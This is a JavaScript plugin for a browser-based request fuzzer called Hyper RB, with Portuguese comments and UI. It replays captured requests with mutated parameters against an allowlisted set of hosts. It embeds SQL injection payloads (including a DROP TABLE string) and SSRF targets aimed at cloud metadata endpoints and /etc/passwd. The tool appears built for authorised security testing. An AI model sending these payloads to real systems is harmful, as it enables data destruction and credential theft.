// ============================================================
// Hyper RB · Script #18 · smart-replay-fuzz
// v5.0: BUG#3 fix — suporte a form-urlencoded, query-string e
//       text-plain mantendo dicionários SQLi/SSRF intactos.
//       Melhoria: export CSV, params de query-string da URL,
//       content-type badge, serialização por kind.
// ============================================================
(function registerSmartReplayFuzz() {
  "use strict";

  const S = window.HYPER_RB_SHARED;
  if (!S) {
    console.error("[Hyper RB · smart-replay-fuzz] HYPER_RB_SHARED ausente");
    return;
  }

  const MAX_VARIANTS_TOTAL = 50;
  const MIN_DEBOUNCE_MS = 500;

  const SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1--", `" OR "1"="1`, "1; DROP TABLE users--",
    "' UNION SELECT NULL--", "admin'--", "' OR SLEEP(3)--", "'; WAITFOR DELAY '0:0:3'--",
    "1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
  ];
  const SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "file:///etc/passwd",
    "http://0.0.0.0:22/",
  ];

  const ALLOWED_HOST_RE = /(^|\.)lovable\.(dev|app)$/i;
  const BLOCKED_HEADERS = new Set(["authorization", "cookie", "set-cookie", "proxy-authorization", "host", "content-length"]);

  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  function cloneHeaders(h) {
    const out = {};
    for (const [k, v] of Object.entries(h || {})) {
      if (BLOCKED_HEADERS.has(String(k).toLowerCase())) continue;
      out[k] = v;
    }
    return out;
  }

  // BUG #3 FIX: parseBody agora suporta JSON, form-urlencoded, query-string e text-plain
  function parseBody(body, contentType) {
    const ct = String(contentType || "").toLowerCase();
    if (body == null || body === "") return { kind: "empty", obj: null, raw: "", contentType: ct };

    // 1) JSON
    try {
      const obj = JSON.parse(body);
      if (obj && typeof obj === "object") {
        return { kind: "json", obj, raw: body, contentType: ct };
      }
    } catch {}

    // 2) form-urlencoded (por content-type ou heurística key=value&...)
    const looksForm = ct.includes("application/x-www-form-urlencoded") ||
      (!ct.includes("text/plain") && /^[^{["\s][^=\n]*=[^&\n]*(&[^=\n]*=[^&\n]*)*$/.test(String(body).trim().slice(0, 512)));
    if (looksForm) {
      try {
        const params = new URLSearchParams(body);
        const obj = {};
        for (const [k, v] of params.entries()) obj[k] = v;
        if (Object.keys(obj).length) {
          return { kind: "form", obj, raw: body, contentType: "application/x-www-form-urlencoded" };
        }
      } catch {}
    }

    // 3) text/plain — wrap como campo único mutável
    return { kind: "text", obj: { _body: String(body) }, raw: String(body), contentType: ct || "text/plain" };
  }

  // Serializa obj de volta ao formato original
  function serializeBody(obj, parsedBody) {
    if (parsedBody.kind === "json") return JSON.stringify(obj);
    if (parsedBody.kind === "form") {
      const p = new URLSearchParams();
      for (const [k, v] of Object.entries(obj)) p.set(k, v == null ? "" : String(v));
      return p.toString();
    }
    if (parsedBody.kind === "text") return obj._body != null ? String(obj._body) : "";
    return String(parsedBody.raw || "");
  }

  // Clona obj mutável sem depender de JSON.parse(raw) — seguro para form/text
  function cloneObj(parsedBody) {
    if (parsedBody.kind === "json") return JSON.parse(parsedBody.raw);
    return Object.assign({}, parsedBody.obj);
  }

  // Constrói headers corretos por kind
  function buildContentTypeHeader(parsedBody, originalHeaders) {
    const h = cloneHeaders(originalHeaders);
    if (parsedBody.kind === "json")  h["content-type"] = "application/json";
    if (parsedBody.kind === "form")  h["content-type"] = "application/x-www-form-urlencoded";
    if (parsedBody.kind === "text")  h["content-type"] = "text/plain";
    return h;
  }

  function flattenParams(obj) {
    const params = [];
    if (!obj || typeof obj !== "object") return params;
    for (const [k, v] of Object.entries(obj)) {
      if (v !== null && typeof v === "object" && !Array.isArray(v)) {
        for (const [k2, v2] of Object.entries(v)) {
          if (v2 !== null && typeof v2 === "object") continue;
          params.push({ path: `${k}.${k2}`, value: v2, type: typeof v2 });
        }
      } else if (!Array.isArray(v) || v.every((x) => typeof x !== "object")) {
        params.push({ path: k, value: v, type: Array.isArray(v) ? "array" : typeof v });
      }
    }
    return params;
  }

  function setByPath(obj, path, value) {
    const parts = path.split(".");
    let cur = obj;
    for (let i = 0; i < parts.length - 1; i++) {
      if (!cur[parts[i]] || typeof cur[parts[i]] !== "object") cur[parts[i]] = {};
      cur = cur[parts[i]];
    }
    cur[parts[parts.length - 1]] = value;
  }

  function generateMutations(originalValue, acceptedValues, type, extraPayloads) {
    const set = new Set();
    for (const v of acceptedValues) set.add(JSON.stringify(v));
    if (type === "string") {
      for (const v of acceptedValues) {
        if (typeof v !== "string") continue;
        set.add(JSON.stringify(v.toUpperCase()));
        set.add(JSON.stringify(v.toLowerCase()));
        set.add(JSON.stringify(v + "_x"));
        set.add(JSON.stringify("x_" + v));
        set.add(JSON.stringify(v.slice(0, Math.max(1, Math.floor(v.length / 2)))));
      }
      set.add(JSON.stringify(""));
      set.add(JSON.stringify("a".repeat(1024)));
    } else if (type === "number") {
      for (const v of acceptedValues) {
        const n = Number(v);
        if (Number.isFinite(n)) {
          set.add(JSON.stringify(n + 1));
          set.add(JSON.stringify(n - 1));
          set.add(JSON.stringify(n * 2));
          set.add(JSON.stringify(-n));
        }
      }
      set.add(JSON.stringify(0));
      set.add(JSON.stringify(-1));
      set.add(JSON.stringify(Number.MAX_SAFE_INTEGER));
    } else if (type === "boolean") {
      set.add(JSON.stringify(true));
      set.add(JSON.stringify(false));
    } else if (type === "array") {
      set.add(JSON.stringify([]));
      for (const v of acceptedValues) set.add(JSON.stringify(Array.isArray(v) ? v : [v]));
    }
    set.add(JSON.stringify(null));
    if (Array.isArray(extraPayloads)) {
      for (const p of extraPayloads) set.add(JSON.stringify(p));
    }
    set.delete(JSON.stringify(originalValue));
    return Array.from(set).map((s) => JSON.parse(s));
  }

  function parseAcceptedInput(text) {
    if (!text || !text.trim()) return [];
    return text.split(",").map((s) => {
      const t = s.trim();
      if (!t) return null;
      try { return JSON.parse(t); } catch { return t; }
    }).filter((v) => v !== null);
  }

  function classifyResult(originalStatus, status) {
    if (status >= 200 && status < 300) {
      if (originalStatus >= 200 && originalStatus < 300) return { tag: "accepted", label: "Aceito ✓" };
      return { tag: "newly-accepted", label: "NOVO ACEITO ★" };
    }
    if (status === 400 || status === 422) return { tag: "rejected", label: "Rejeitado" };
    if (status === 401 || status === 403) return { tag: "auth", label: "Auth" };
    if (status === 429) return { tag: "rate", label: "Rate-limited ⚠" };
    if (status >= 500) return { tag: "error", label: "Erro upstream" };
    return { tag: "other", label: String(status || "?") };
  }

  // Extrai params de query-string da URL
  function extractQueryParams(url) {
    try {
      const u = new URL(url);
      const obj = {};
      for (const [k, v] of u.searchParams.entries()) obj[k] = v;
      return Object.keys(obj).length ? obj : null;
    } catch { return null; }
  }

  const KIND_BADGE = { json: "JSON", form: "form-urlencoded", text: "text/plain", empty: "vazio", raw: "raw" };

  const SCRIPT = {
    id: 18,
    slug: "smart-replay-fuzz",
    name: "Smart Replay Fuzz",
    description: "Marque parâmetros, forneça valores aceitos e descubra novos valores que o backend aceita. Suporta JSON, form-urlencoded, query-string e text/plain.",
    icon: "🎯",
    needsAI: false,
    needsNetwork: true,
    minRequests: 1,

    async run(ctx) {
      if (!ctx.requests.length) {
        return { ok: false, error: "Capture pelo menos 1 request antes." };
      }

      const list = ctx.requests
        .slice(-100)
        .reverse()
        .map((r) => ({ id: r.id, label: `${r.method} ${r.host}${r.pathname}`.slice(0, 90), status: r.status }));

      return {
        ok: true,
        summary: `${ctx.requests.length} requests disponíveis para fuzz`,
        render(mountEl) {
          mountEl.innerHTML = `
            <div class="hyper-rb-srf">
              <div class="srf-toolbar">
                <label>Request alvo:</label>
                <select class="srf-select">
                  ${list.map((r) => `<option value="${S.escapeHtml(r.id)}">${S.escapeHtml(r.label)}${r.status ? " · " + r.status : ""}</option>`).join("")}
                </select>
                <button class="srf-load" type="button">Carregar parâmetros</button>
              </div>
              <div class="srf-warn">
                <strong>Aviso:</strong> apenas hosts <code>lovable.dev</code> / <code>*.lovable.app</code>.
                Máximo ${MAX_VARIANTS_TOTAL} variantes. Suporta JSON, form-urlencoded, query-string, text/plain.
              </div>
              <div class="srf-dict-opt" style="background:rgba(191,0,255,.06);border:1px solid rgba(191,0,255,.2);border-radius:8px;padding:8px 12px;font-size:11px;display:flex;gap:12px;align-items:center;flex-wrap:wrap;">
                <strong style="color:#bf00ff;">🔬 Dicionários de segurança (opt-in)</strong>
                <label><input type="checkbox" class="srf-sqli-cb" /> Injetar payloads SQLi</label>
                <label><input type="checkbox" class="srf-ssrf-cb" /> Injetar payloads SSRF</label>
                <span style="color:rgba(255,255,255,.45);">Substitui o valor do parâmetro selecionado pelos payloads do dicionário.</span>
              </div>
              <div class="srf-kind-badge" style="display:none;font-family:monospace;font-size:10px;padding:4px 10px;border-radius:4px;background:rgba(191,0,255,.15);color:#bf00ff;width:fit-content;"></div>
              <div class="srf-params"></div>
              <div class="srf-run-row" style="display:none;">
                <label>Debounce (ms):</label>
                <input class="srf-debounce" type="number" value="800" min="${MIN_DEBOUNCE_MS}" step="100" />
                <button class="srf-run" type="button">Executar fuzz</button>
                <button class="srf-abort" type="button" style="display:none;">⏹ Abortar</button>
                <button class="srf-export-csv" type="button" style="display:none;">⬇ Export CSV</button>
                <span class="srf-progress"></span>
              </div>
              <div class="srf-output"></div>
            </div>
            <style>
              .hyper-rb-srf { display:flex; flex-direction:column; gap:10px; font-size:12px; color:#fff; }
              .srf-toolbar, .srf-run-row { display:flex; gap:8px; align-items:center; flex-wrap:wrap; }
              .srf-toolbar select { flex:1; min-width:240px; background:rgba(18,18,20,.7); color:#fff; border:1px solid rgba(191,0,255,.3); padding:6px 8px; border-radius:6px; }
              .srf-toolbar button, .srf-run-row button { background:rgba(191,0,255,.2); color:#fff; border:1px solid rgba(191,0,255,.4); padding:6px 12px; border-radius:6px; cursor:pointer; }
              .srf-toolbar button:hover:not(:disabled), .srf-run-row button:hover:not(:disabled) { background:rgba(191,0,255,.35); }
              button:disabled { opacity:.5; cursor:not-allowed; }
              .srf-abort { background:rgba(255,60,60,.2) !important; border-color:rgba(255,60,60,.4) !important; }
              .srf-export-csv { background:rgba(0,200,120,.1) !important; color:#73ffb8 !important; border-color:rgba(0,200,120,.3) !important; }
              .srf-warn { background:rgba(255,180,0,.08); border:1px solid rgba(255,180,0,.3); border-radius:8px; padding:8px 12px; font-size:11px; color:rgba(255,255,255,.85); }
              .srf-warn code { background:rgba(255,180,0,.15); padding:1px 4px; border-radius:3px; }
              .srf-params { display:flex; flex-direction:column; gap:6px; background:rgba(0,0,0,.3); border:1px solid rgba(255,255,255,.08); border-radius:8px; padding:10px; }
              .srf-params:empty { display:none; }
              .srf-param-row { display:grid; grid-template-columns:24px 1fr 1fr 2fr; gap:8px; align-items:center; padding:6px; border-radius:6px; background:rgba(18,18,20,.5); }
              .srf-param-row input[type=text] { background:rgba(0,0,0,.4); color:#fff; border:1px solid rgba(255,255,255,.12); padding:4px 6px; border-radius:4px; font-family:monospace; font-size:11px; }
              .srf-param-row.checked { border-left:3px solid #bf00ff; }
              .srf-param-path { font-family:monospace; color:#bf00ff; font-size:11px; word-break:break-all; }
              .srf-param-orig { color:rgba(255,255,255,.6); font-family:monospace; font-size:11px; word-break:break-all; }
              .srf-run-row input { background:rgba(18,18,20,.7); color:#fff; border:1px solid rgba(191,0,255,.3); padding:4px 8px; border-radius:4px; width:90px; }
              .srf-progress { color:rgba(191,0,255,.9); font-size:11px; }
              .srf-output { background:rgba(0,0,0,.3); border:1px solid rgba(255,255,255,.08); border-radius:8px; padding:10px; max-height:400px; overflow:auto; }
              .srf-output:empty { display:none; }
              .srf-result-table { width:100%; border-collapse:collapse; font-size:11px; }
              .srf-result-table th, .srf-result-table td { padding:5px 8px; text-align:left; border-bottom:1px solid rgba(255,255,255,.06); vertical-align:top; }
              .srf-result-table th { background:rgba(191,0,255,.15); position:sticky; top:0; }
              .srf-result-table code { font-family:monospace; color:#fff; word-break:break-all; }
              .tag-newly-accepted { background:rgba(115,255,184,.2); color:#73ffb8; padding:2px 6px; border-radius:4px; font-weight:bold; }
              .tag-accepted { color:#73ffb8; }
              .tag-rejected { color:#ff9977; }
              .tag-auth, .tag-rate { color:#ffd66b; }
              .tag-error { color:#ff5577; }
              .tag-other { color:rgba(255,255,255,.6); }
              .srf-error { color:#ff5577; padding:8px; }
            </style>
          `;

          const select = mountEl.querySelector(".srf-select");
          const btnLoad = mountEl.querySelector(".srf-load");
          const paramsEl = mountEl.querySelector(".srf-params");
          const runRow = mountEl.querySelector(".srf-run-row");
          const btnRun = mountEl.querySelector(".srf-run");
          const btnAbort = mountEl.querySelector(".srf-abort");
          const btnExportCsv = mountEl.querySelector(".srf-export-csv");
          const debounceInput = mountEl.querySelector(".srf-debounce");
          const progressEl = mountEl.querySelector(".srf-progress");
          const outputEl = mountEl.querySelector(".srf-output");
          const kindBadge = mountEl.querySelector(".srf-kind-badge");

          let currentReq = null;
          let currentParams = [];
          let parsedBody = null;
          let abortCtrl = null;
          let lastResults = [];
          let lastBaselineStatus = 0;

          btnLoad.addEventListener("click", () => {
            outputEl.innerHTML = "";
            runRow.style.display = "none";
            paramsEl.innerHTML = "";
            kindBadge.style.display = "none";
            btnExportCsv.style.display = "none";

            const req = ctx.requests.find((r) => r.id === select.value);
            if (!req) {
              paramsEl.innerHTML = `<div class="srf-error">Request não encontrada.</div>`;
              return;
            }
            if (!ALLOWED_HOST_RE.test(req.host || "")) {
              paramsEl.innerHTML = `<div class="srf-error">Host não permitido: <code>${S.escapeHtml(req.host || "?")}</code></div>`;
              return;
            }

            currentReq = req;
            paramsEl.innerHTML = `<div class="hyper-rb-loading">Carregando body bruto…</div>`;
            ctx.getRawRequest(req.id).then((raw) => {
              const rawBody = (raw && raw.ok && raw.raw && raw.raw.requestBody) ? raw.raw.requestBody : req.reqBody;
              const ct = (req.reqHeaders && (req.reqHeaders["content-type"] || req.reqHeaders["Content-Type"])) || "";
              renderParams(rawBody, ct);
            }).catch(() => renderParams(req.reqBody, ""));
          });

          function renderParams(bodyToParse, contentType) {
            paramsEl.innerHTML = "";
            parsedBody = parseBody(bodyToParse, contentType);

            // BUG #3 FIX: suporte a form, text além de json
            if (parsedBody.kind === "empty" || parsedBody.kind === "raw") {
              // Tenta query-string da URL como fallback
              const qp = extractQueryParams(currentReq.url || "");
              if (qp) {
                parsedBody = { kind: "query", obj: qp, raw: bodyToParse || "", contentType };
              } else {
                const isTruncated = typeof bodyToParse === "string" && (bodyToParse.includes("…(+") || bodyToParse.includes("/* truncated */"));
                const msg = isTruncated
                  ? "Body truncado (>64KB). Use uma request menor."
                  : "Body vazio ou formato não reconhecido. Tente uma request com body JSON, form-urlencoded ou text/plain.";
                paramsEl.innerHTML = `<div class="srf-error">${S.escapeHtml(msg)}</div>`;
                return;
              }
            }

            // Badge de tipo
            const badgeLabel = parsedBody.kind === "query" ? "query-string (URL)" : (KIND_BADGE[parsedBody.kind] || parsedBody.kind);
            kindBadge.textContent = `Formato detectado: ${badgeLabel}`;
            kindBadge.style.display = "";

            currentParams = flattenParams(parsedBody.obj);
            if (!currentParams.length) {
              paramsEl.innerHTML = `<div class="srf-error">Nenhum parâmetro detectado.</div>`;
              return;
            }

            paramsEl.innerHTML = currentParams.map((p, idx) => `
              <div class="srf-param-row" data-idx="${idx}">
                <input type="checkbox" class="srf-check" data-idx="${idx}" />
                <div class="srf-param-path">${S.escapeHtml(p.path)} <small style="color:rgba(255,255,255,.4);">(${p.type})</small></div>
                <div class="srf-param-orig">${S.escapeHtml(truncate(JSON.stringify(p.value), 40))}</div>
                <input type="text" class="srf-accepted" data-idx="${idx}" placeholder='valores aceitos (ex: "a","b",123)' disabled />
              </div>
            `).join("");

            paramsEl.querySelectorAll(".srf-check").forEach((cb) => {
              cb.addEventListener("change", (e) => {
                const idx = e.target.dataset.idx;
                const row = paramsEl.querySelector(`.srf-param-row[data-idx="${idx}"]`);
                const input = paramsEl.querySelector(`.srf-accepted[data-idx="${idx}"]`);
                row.classList.toggle("checked", e.target.checked);
                input.disabled = !e.target.checked;
                updateRunVisibility();
              });
            });

            runRow.style.display = "flex";
          }

          function updateRunVisibility() {
            const anyChecked = !!paramsEl.querySelector(".srf-check:checked");
            btnRun.disabled = !anyChecked;
          }

          function truncate(s, n) {
            s = String(s);
            return s.length > n ? s.slice(0, n) + "…" : s;
          }

          btnAbort.addEventListener("click", () => { if (abortCtrl) abortCtrl.abort(); });

          btnExportCsv.addEventListener("click", () => {
            if (!lastResults.length) return;
            const header = "Parâmetro,Valor,Status,Resultado,ms\n";
            const rows = lastResults.map((r) => {
              const cls = classifyResult(lastBaselineStatus, r.status);
              const esc = (s) => `"${String(s || "").replace(/"/g, '""')}"`;
              return [esc(r.path), esc(JSON.stringify(r.value)), r.status || "", esc(cls.label), r.ms || ""].join(",");
            }).join("\n");
            S.downloadBlob(`srf-results-${Date.now()}.csv`, "text/csv", header + rows);
          });

          btnRun.addEventListener("click", async () => {
            if (!currentReq || !parsedBody) return;

            const debounce = S.safeInt(debounceInput.value, { min: MIN_DEBOUNCE_MS, max: 60000, default: MIN_DEBOUNCE_MS });
            debounceInput.value = debounce;

            const sqliEnabled = mountEl.querySelector(".srf-sqli-cb")?.checked;
            const ssrfEnabled = mountEl.querySelector(".srf-ssrf-cb")?.checked;
            const extraPayloads = [];
            if (sqliEnabled) extraPayloads.push(...SQLI_PAYLOADS);
            if (ssrfEnabled) extraPayloads.push(...SSRF_PAYLOADS);

            const targets = [];
            paramsEl.querySelectorAll(".srf-check:checked").forEach((cb) => {
              const idx = parseInt(cb.dataset.idx, 10);
              const accepted = parseAcceptedInput(paramsEl.querySelector(`.srf-accepted[data-idx="${idx}"]`).value);
              targets.push({ ...currentParams[idx], accepted });
            });

            const variants = [];
            for (const t of targets) {
              const mutations = generateMutations(t.value, t.accepted, t.type, extraPayloads);
              for (const mv of mutations) {
                if (variants.length >= MAX_VARIANTS_TOTAL) break;
                variants.push({ path: t.path, value: mv });
              }
              if (variants.length >= MAX_VARIANTS_TOTAL) break;
            }

            if (!variants.length) {
              outputEl.innerHTML = `<div class="srf-error">Nenhuma mutação gerada. Forneça pelo menos 1 valor aceito.</div>`;
              return;
            }

            abortCtrl = new AbortController();
            const signal = abortCtrl.signal;
            btnRun.disabled = true;
            btnAbort.style.display = "";
            btnExportCsv.style.display = "none";
            outputEl.innerHTML = `<div>Rodando baseline…</div>`;

            const baseHeaders = buildContentTypeHeader(parsedBody, currentReq.reqHeaders);
            let baselineStatus = 0;
            try {
              let _reqHost = currentReq.host || "";
              if (!_reqHost) {
                try { _reqHost = new URL(currentReq.url || "http://invalid").hostname; } catch { _reqHost = ""; }
              }
              if (!ALLOWED_HOST_RE.test(_reqHost)) {
                progressEl.textContent = "⛔ Host não permitido: " + (_reqHost || "?");
                btnRun.disabled = false;
                btnAbort.style.display = "none";
                return;
              }
              const baseRes = await ctx.proxyFetch(currentReq.url, {
                method: currentReq.method,
                headers: baseHeaders,
                body: parsedBody.raw || undefined,
              });
              baselineStatus = baseRes.status || 0;
            } catch (e) {
              ctx.log?.("warn", "baseline falhou", e);
            }

            const results = [];
            let rateLimitHits = 0;
            for (let i = 0; i < variants.length; i++) {
              if (signal.aborted) {
                progressEl.textContent = `⏹ Abortado após ${i} variantes.`;
                break;
              }

              const v = variants[i];
              progressEl.textContent = `${i + 1} / ${variants.length} — ${v.path}`;

              // BUG #3 FIX: clonar e serializar conforme o kind (não mais JSON.parse fixo)
              const mutObj = cloneObj(parsedBody);
              setByPath(mutObj, v.path, v.value);
              const mutBody = serializeBody(mutObj, parsedBody);

              try {
                const res = await ctx.proxyFetch(currentReq.url, {
                  method: currentReq.method,
                  headers: baseHeaders,
                  body: mutBody,
                });
                results.push({ path: v.path, value: v.value, status: res.status || 0, ms: res.durationMs || 0, error: res.error });

                if (res.status === 429) {
                  rateLimitHits++;
                  if (rateLimitHits >= 3) {
                    progressEl.textContent = `⚠ Rate-limit (429) repetido — abortando.`;
                    break;
                  }
                  await sleep(debounce * 3);
                  continue;
                } else {
                  rateLimitHits = 0;
                }
              } catch (e) {
                if (signal.aborted) break;
                results.push({ path: v.path, value: v.value, status: 0, ms: 0, error: String((e && e.message) || e) });
              }
              if (i < variants.length - 1) await sleep(debounce);
            }

            lastResults = results;
            lastBaselineStatus = baselineStatus;
            if (!signal.aborted) progressEl.textContent = `concluído — baseline status ${baselineStatus}`;
            renderResults(results, baselineStatus);
            btnRun.disabled = false;
            btnAbort.style.display = "none";
            btnExportCsv.style.display = results.length ? "" : "none";
            abortCtrl = null;
          });

          function renderResults(results, baselineStatus) {
            const sorted = [...results].sort((a, b) => {
              const aNew = classifyResult(baselineStatus, a.status).tag === "newly-accepted" ? 0 : 1;
              const bNew = classifyResult(baselineStatus, b.status).tag === "newly-accepted" ? 0 : 1;
              return aNew - bNew;
            });
            outputEl.innerHTML = `
              <table class="srf-result-table">
                <thead><tr><th>Parâmetro</th><th>Valor testado</th><th>Status</th><th>Resultado</th><th>ms</th></tr></thead>
                <tbody>
                  ${sorted.map((r) => {
                    const cls = classifyResult(baselineStatus, r.status);
                    return `<tr>
                      <td><code>${S.escapeHtml(r.path)}</code></td>
                      <td><code>${S.escapeHtml(truncate(JSON.stringify(r.value), 60))}</code></td>
                      <td>${r.status || (r.error ? "✕" : "?")}</td>
                      <td><span class="tag-${cls.tag}">${S.escapeHtml(cls.label)}</span></td>
                      <td>${r.ms}</td>
                    </tr>`;
                  }).join("")}
                </tbody>
              </table>
            `;
          }
        },
      };
    },
  };

  window.HYPER_RB_SCRIPTS = window.HYPER_RB_SCRIPTS || [];
  window.HYPER_RB_SCRIPTS.push(SCRIPT);
})();
